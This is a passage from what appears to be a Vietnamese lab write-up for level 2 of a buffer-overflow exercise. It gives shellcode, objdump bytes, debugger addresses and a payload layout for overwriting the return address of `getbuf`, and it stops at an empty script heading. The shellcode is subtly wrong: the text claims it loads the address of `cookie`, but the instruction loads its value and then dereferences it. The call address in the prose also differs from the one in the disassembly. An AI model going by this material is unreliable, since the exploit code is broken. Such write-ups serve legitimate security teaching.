# Level 2
## Task
Buffer overflow hàm `getbuf` để thực thi được hàm `bang` với `global_value == cookie`.  
```c
void __noreturn bang()
{
  if ( global_value == cookie )
  {
    printf("Bang!: You set global_value to 0x%x\n", global_value);
    validate(2);
  }
  else
  {
    printf("Misfire: global_value = 0x%x\n", global_value);
  }
  exit(0);
}
```

## Solution
Tương tự như các level trước, chúng ta vẫn sẽ overflow buffer có độ dài `40` bytes. Nhưng ở level này, chúng ta cần inject shellcode để có thể set giá trị của `global_value` bằng với giá trị `cookie`.  

Trước tiên, để gán được giá trị mới cho `global_value`, chúng ta cần biết được địa chỉ của `global_value`. Trong IDA Pro, chúng ta có thể xem được địa chỉ của biến `global_value`.  
```
.bss:8013F160 global_value    dd ?
```  

Và cả địa chỉ của biến `cookie`.  
```
.bss:8013F158 cookie          dd ?
```  

Vậy shellcode của chúng ta như sau:  
```asm
movl 0x8013F158, %eax
movl (%eax), %eax
movl %eax, (0x8013F160)
call 0x80139B69
```  

Ở shellcode trên, chúng ta gán địa chỉ của biến `cookie` vào thanh ghi `%eax`. Sau đó, chúng ta đọc giá trị `cookie` và gán giá trị đó vào `%eax`. Kế đến, chúng ta gán giá trị `cookie` này vào `global_value`, và cuối cùng là gọi hàm `bang`.  
> `0x80139B69` chính là địa chỉ của hàm `bang`.  

Byte representation của shellcode:  
```
└─$ objdump -d shellcode.o

shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   a1 58 f1 13 80          mov    0x8013f158,%eax
   5:   8b 00                   mov    (%eax),%eax
   7:   a3 60 f1 13 80          mov    %eax,0x8013f160
   c:   e8 65 9b 13 80          call   0x80139b76
```

Tiếp theo, chúng ta sẽ tìm địa chỉ để ghi đè vào `return address`.  
Ở đây, vì shellcode sẽ được chèn vào đầu chuỗi nhập nên giá trị mà chúng ta sẽ ghi đè lên `return address` chính là địa chỉ của chuỗi nhập. Trong quá trình debug thì chúng ta tìm được địa chỉ là:  
```
pwndbg> p/x $eax
$1 = 0x55683cf8
```  

Vậy `exploit_payload` của chúng ta sẽ có độ dài là `0x28 + 0x4 + 0x4` với `0x28` bytes sẽ chứa shellcode và các giá trị padding, `0x4` bytes tiếp theo để ghi đè `saved %ebp`, và `0x4` bytes cuối cùng để ghi đè `return address`.  

### Script
```python

